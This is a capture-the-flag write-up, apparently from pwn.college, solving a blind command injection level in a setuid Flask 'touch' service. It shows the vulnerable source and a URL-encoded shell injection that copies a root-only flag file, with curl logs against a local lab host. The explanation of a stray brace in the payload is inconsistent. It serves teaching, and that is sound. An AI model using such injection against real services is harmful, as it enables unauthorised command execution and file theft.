## Exercise
Programs tend to shell out to do complex internal computation. This means that you might not always get sent the resulting output, and you will need to do your attack _blind_. Try it in this level: without the output of your injected command, get the flag!
## Solution
At first, let's check the permissions on the server:
```
> ls -la
drwxr-xr-x    1 root root 4096 Sep  1 10:39 challenge
-r--------    1 root root   60 Sep  1 10:39 flag

> ls -la /challenge/
-rwsr-xr-x 1 root root  257 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 1139 Sep  6  2025 server
```
Only root may read flag and I am allowed to read and execute the challenge files. Therefore let's read the server file.
```
> cat /challenge/server

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/adventure", methods=["GET"])
def challenge():
    arg = flask.request.args.get("target-file", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/adventure"><input type=text name=target-file><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge"
```
The server listens for GET requests on /adventure and accepts arguments over target-file. The default value for target-file is "/challenge/PWN".
It takes the argument and puts it into the command:
```
command = f"touch {arg}"
```
Afterwards the server starts a subprocess and runs the command in a shell.

### Injection
Let's try to inject a string that will trick the server to print us the flag.
The command:
```
f"touch {arg}"
```
How the command prints our flag:
```
f"touch {flag ; cat /flag > flag -- }"
```
This will take the flag and store the output in the newly touched file
Therefore our argument has to be:
```
flag}SP;SPcatSP/flagSP>SPflagSP--SP
```
Whereby SP is the space character.
Let's encode all special characters:
```
SP = %20
;  = %3B
/  = %2F
>  = %3E
-  = %2D
```
Our encoded String:
```
flag%20%3B%20cat%20%2Fflag%20%3E%20flag%20%2D%2D%20
```
Our http link:
```
http://challenge.localhost:80/adventure?target-file=flag%20%3B%20cat%20%2Fflag%20%3E%20flag%20%2D%2D%20
```
Let's try it out:
```
> curl -L -v http://challenge.localhost:80/adventure?target-file=flag%7D%20%3B%20cat%20%2Fflag%20%3E%20flag%20%2D%2D%20

* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 36634 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 42996
* using HTTP/1.x
> GET /adventure?target-file=flag%7D%20%3B%20cat%20%2Fflag%20%3E%20flag%20%2D%2D%20 HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
DEBUG: command='touch flag ; cat /flag > flag -- '
127.0.0.1 - - [01/Sep/2026 13:55:49] "GET /adventure?target-file=flag}%20;%20cat%20/flag%20>%20flag%20--%20 HTTP/1.1" 200 -
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Tue, 01 Sep 2026 13:55:49 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 302
< Connection: close
<

        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/adventure"><input type=text name=target-file><input type=submit value=Submit></form>
        <hr>
        <b>Ran touch flag ; cat /flag > flag -- !</b><br>
        </body></html>
* shutting down connection #0
```
Our new flag file in our the current folder:
```
> cat flag
pwn.college{[REDACTED FLAG]}
```

